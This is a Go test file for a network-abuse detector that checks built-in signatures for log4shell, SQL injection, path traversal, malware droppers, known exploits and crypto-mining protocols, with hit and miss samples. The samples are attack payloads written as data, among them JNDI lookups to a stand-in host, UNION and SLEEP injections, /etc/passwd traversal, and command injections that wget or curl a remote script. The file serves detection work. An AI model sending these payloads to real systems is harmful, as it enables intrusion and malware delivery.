package abuse

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func allKinds(Kind) bool { return true }

func TestBuiltinSignatures(t *testing.T) {
	signatures, err := CompileSignatures(allKinds, BuiltinSignatures)
	if err != nil {
		t.Fatal(err)
	}
	if len(signatures) != len(BuiltinSignatures) {
		t.Fatal("compiled ", len(signatures), " of ", len(BuiltinSignatures))
	}
	cases := map[string]struct{ hit, miss []string }{
		"log4shell": {
			hit:  []string{"GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1", "User-Agent: ${${lower:j}ndi:${lower:l}dap://x}", "GET /${${::-j}${::-n}${::-d}${::-i}:rmi://x/a} HTTP/1.1"},
			miss: []string{"GET /app.js?v=${version} HTTP/1.1", "GET /search?q=jndi HTTP/1.1"},
		},
		"sql-injection": {
			hit:  []string{"GET /item.php?id=1+UNION+ALL+SELECT+1,2,3-- HTTP/1.1", "GET /?id=1/**/UNION/**/SELECT/**/1 HTTP/1.1", "GET /?q=1' AND SLEEP(5)-- HTTP/1.1", "GET /?t=information_schema.tables HTTP/1.1"},
			miss: []string{"GET /blog/the-union-selects-a-new-leader HTTP/1.1", "GET /sleep-tips?and=sleep HTTP/1.1"},
		},
		"path-traversal": {
			hit:  []string{"GET /download?file=../../../../etc/passwd HTTP/1.1", "GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1", "GET /?f=..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1"},
			miss: []string{"GET /../style.css HTTP/1.1", "GET /docs/etc/passwd-format HTTP/1.1"},
		},
		"malware-dropper": {
			hit:  []string{"POST /cgi-bin/luci HTTP/1.1\r\n\r\nping=;wget http://1.2.3.4/x.sh", "GET /setup.cgi?cmd=$(curl${IFS}http://x) HTTP/1.1", "GET /bin/busybox HTTP/1.1"},
			miss: []string{"GET /downloads/wget-1.21.tar.gz HTTP/1.1", "User-Agent: curl/8.10.1"},
		},
		"known-exploit": {
			hit:  []string{"POST /test.php?%ADd+allow_url_include%3d1 HTTP/1.1", "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", "GET /cgi-bin/.%2e/%2e%2e/bin/sh HTTP/1.1"},
			miss: []string{"GET /docs/php-ini/allow_url_include HTTP/1.1"},
		},
		"stratum": {
			hit:  []string{`{"id": 1, "method": "mining.subscribe", "params": ["cgminer/4.12.1"]}` + "\n", `{"id":2,"method":"mining.authorize","params":["wallet.rig","x"]}`},
			miss: []string{`{"jsonrpc":"2.0","method":"eth_getBalance","params":[]}`},
		},
		"miner-login": {
			hit:  []string{`{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"4AdU","pass":"x","agent":"XMRig/6.22.2 (Linux x86_64) libuv/1.48.0 gcc/13.2.0","algo":["rx/0"]}}`},
			miss: []string{`{"method":"login","params":{"user":"alice","agent":"Mozilla/5.0"}}`},
		},
		"ethproxy": {
			hit:  []string{`{"id":1,"method":"eth_submitLogin","params":["0xabc"],"worker":"rig1"}`},
			miss: []string{`{"id":1,"method":"eth_blockNumber"}`},
		},
	}
	for _, signature := range signatures {
		testCase, found := cases[signature.Name]
		if !found {
			t.Error("no samples for ", signature.Name)
			continue
		}
		for _, sample := range testCase.hit {
			if matched, hit := MatchSignatures([]Signature{signature}, []byte(sample)); !hit || matched.Name != signature.Name {
				t.Errorf("%s missed %q", signature.Name, sample)
			}
		}
		// Look-alikes must pass every signature, not just their own.
		for _, sample := range testCase.miss {
			if matched, hit := MatchSignatures(signatures, []byte(sample)); hit {
				t.Errorf("%s matched %q", matched.Name, sample)
			}
		}
		wantKind := Exploit
		if signature.Name == "stratum" || signature.Name == "miner-login" || signature.Name == "ethproxy" {
			wantKind = Mining
		}
		if signature.Kind != wantKind {
			t.Errorf("%s is %s", signature.Name, signature.Kind)
		}
	}
	// A TLS record is not looked into.
	if _, hit := MatchSignatures(signatures, []byte("\x16\x03\x01../../../../etc/passwd")); hit {
		t.Error("matched inside a TLS record")
	}
}

func TestCompileSignatureLayers(t *testing.T) {
	update := []SignatureSpec{
		{Name: "log4shell", Regex: `^fixed$`},
		{Name: "sql-injection", Disabled: true},
		{Name: "new-one", Regex: `evil-path`},
		{Name: "broken", Regex: `(`},
	}
	onlyExploits := func(kind Kind) bool { return kind == Exploit }
	signatures, err := CompileSignatures(onlyExploits, BuiltinSignatures, update)
	if err == nil || !strings.Contains(err.Error(), "broken") {
		t.Error("broken regex not reported: ", err)
	}
	var names []string
	for _, signature := range signatures {
		names = append(names, signature.Name)
		if signature.Kind == Mining {
			t.Error("mining signature compiled with mining disabled")
		}
		if signature.Name == "log4shell" && signature.Regexp.String() != `^fixed$` {
			t.Error("update did not replace log4shell")
		}
	}
	if got := strings.Join(names, ","); got != "log4shell,path-traversal,malware-dropper,known-exploit,new-one" {
		t.Error("compiled ", got)
	}
}

func TestParseSignatureFile(t *testing.T) {
	specs, err := ParseSignatureFile([]byte(`{"signatures": [{"name": "a", "regex": "x"}, {"name": "b", "kind": "mining", "regex": "y"}, {"name": "stratum", "disabled": true}]}`))
	if err != nil || len(specs) != 3 {
		t.Fatal(specs, err)
	}
	for _, invalid := range []string{
		`{"signatures": [{"name": "a", "regx": "x"}]}`,
		`{"signatures": [{"name": "a", "kind": "spam", "regex": "x"}]}`,
		`{"signatures": [{"regex": "x"}]}`,
		`{"signatures": [{"name": "a"}]}`,
		`not json`,
	} {
		if _, err = ParseSignatureFile([]byte(invalid)); err == nil {
			t.Error("accepted ", invalid)
		}
	}
	if _, err = ParseSignatureFile(make([]byte, MaxSignatureFileSize+1)); err == nil {
		t.Error("accepted an oversized file")
	}
}

// The README's example update must be one the node accepts.
func TestReadmeSignatureExample(t *testing.T) {
	readme, err := os.ReadFile(filepath.Join("..", "..", "README.md"))
	if err != nil {
		t.Fatal(err)
	}
	// Windows checkouts have CRLF line endings.
	text := strings.ReplaceAll(string(readme), "\r\n", "\n")
	_, example, found := strings.Cut(text, "```json\n{\n  \"signatures\"")
	if !found {
		t.Fatal("no signature example in the README")
	}
	example, _, _ = strings.Cut(example, "```")
	specs, err := ParseSignatureFile([]byte("{\n  \"signatures\"" + example))
	if err != nil {
		t.Fatal(err)
	}
	signatures, err := CompileSignatures(allKinds, BuiltinSignatures, specs)
	if err != nil {
		t.Fatal(err)
	}
	if hit, found := MatchSignatures(signatures, []byte("GET /x.action?redirect:%{(#a=1)} HTTP/1.1")); !found || hit.Name != "struts-ognl" {
		t.Error("struts-ognl example does not match: ", hit.Name)
	}
	if hit, found := MatchSignatures(signatures, []byte(`{"method":"login","params":{"algo":["cn/r"]}}`)); !found || hit.Kind != Mining {
		t.Error("cryptonight-login example does not match")
	}
	for _, signature := range signatures {
		if signature.Name == "sql-injection" {
			t.Error("the example did not turn sql-injection off")
		}
	}
}

func TestSignatureScanLimit(t *testing.T) {
	signatures, _ := CompileSignatures(allKinds, BuiltinSignatures)
	payload := []byte("POST /upload HTTP/1.1\r\n\r\n" + strings.Repeat("a", MaxSignatureScan) + ";wget http://x/y")
	if _, found := MatchSignatures(signatures, payload); found {
		t.Error("scanned past MaxSignatureScan")
	}
	if _, found := MatchSignatures(signatures, payload[len(payload)-MaxSignatureScan:]); !found {
		t.Error("missed the dropper within the limit")
	}
}
